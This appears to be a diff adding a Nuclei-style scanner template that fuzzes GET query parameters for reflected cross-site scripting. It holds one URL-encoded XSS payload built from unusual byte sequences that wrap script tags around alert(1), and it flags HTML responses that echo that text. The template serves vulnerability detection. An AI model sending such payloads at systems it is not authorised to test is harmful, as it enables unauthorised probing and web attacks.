@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-url-encoded
+
+info:
+  name: Custom Reflection XSS Detection with URL Encoded Payload
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specified URL-encoded payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"  # Look for the alert function in the response body
+
+      - type: word
+        part: header
+        words:
+          - "text/html"  # Check if the response is an HTML document
